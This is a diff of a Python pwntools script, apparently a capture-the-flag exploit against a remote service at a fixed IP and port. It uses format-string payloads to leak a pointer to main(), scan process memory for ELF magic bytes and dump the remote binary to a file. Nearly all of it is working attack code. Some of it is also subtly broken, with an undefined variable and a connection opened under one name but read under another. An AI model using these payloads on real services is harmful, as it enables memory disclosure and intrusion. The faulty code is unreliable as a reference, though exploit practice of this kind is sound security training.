@@ -1,7 +1,9 @@
+#String Format Dump Binary!!!
+
 from pwn import *
 
 ip, port = '165.22.122.247', 31683
-io = remote(ip, port)
+#io = remote(ip, port)
 
 def detect():
         for i in range(64):
@@ -10,7 +12,7 @@ def detect():
                 buf = io.recvline().decode().strip().split(' ')[0]
                 print(str(i+1)+' : '+buf)
 
-detect()
+#detect()
 
 '''
 1 : 0x6e
@@ -61,4 +63,64 @@ detect()
 '''
 #overflow length 64
 
+def leak_pointer_to_main():
+	'''12th pointer is one from the main()'''
+	io.sendline(b"%12$p")
+	io.recvuntil(b"> ")
+	leak_all = io.recv()
+	leak = leak_all.decode().split("\n")[0]
+	print("Leaked main address: " + leak)
+	return int(leak,16)
 
+def search_elf_magic_bytes(leaked_main,addr):
+	'''Search through the process memory to find ELF magic bytes: \x7fELF.'''
+	#%8$p is the repeated string pararmeter of the first input string, so we print from the 9th pararmter
+	while True:
+		leak_part = b"%9$sEOF" + b"\x00"
+		try:
+			io.sendline(leak_part + p64(leaked_main + addr))
+			resp = io.recvuntil(b"1. Scream.\n2. Run outside.\n> ")
+			leak = resio.split(b"EOF")[0] + b"\x00"
+			print("Deferenced pointer: " + leak.decode("unicode_escape"))
+			if b"\x7FELF" in leak:
+				magic_bytes = leaked_main + addr
+				print("MAGIC BYTES FOUND @: " + hex(magic_bytes))
+				return magic_bytes, False
+				break
+			addr -=0x100
+		except:
+			addr -=0x100
+			io.close()
+			return addr, True
+
+elf_found = True
+addr = 0
+leaked_main = 0
+while elf_found:
+	p = remote(ip,port)
+	print("CURRENT ADDRESS = " + hex(addr))
+	leaked_main = leak_pointer_to_main() + addr
+	addr, elf_found = search_elf_magic_bytes(leaked_main,addr)
+start_main_addr = addr
+
+def dump_binary(magic_bytes_addr):
+	'''Dump the binary data'''
+	base = magic_bytes_addr
+	leak,leaked = bytearray(),bytearray()
+	offset = len(leaked)
+	while offset <= 0x5000:
+		with open("leak.bin", "ab") as f:
+			addr = p64(base + len(leaked))
+			leak_part = b"%9$sEOF\x00"
+			io.sendline(leak_part + addr)
+			res = io.recvuntil(b"1. Scream.\n2. Run outside.\n> ")
+			leak = res.split(b"EOF")[0] + b"\x00"
+			leaked.extend(leak)
+			print("Address: " + hex(unpack("<Q",addr.ljust(8,b"\x00"))[0]) + " - Offset: " + str(offset) + ":" + hex(offset)+ " - Leaked data: " + leak.decode("unicode_escape"))
+
+			f.write(leak)
+			f.flush()
+			offset = len(leaked)
+
+# Dump binary:
+dump_binary(start_main_addr)
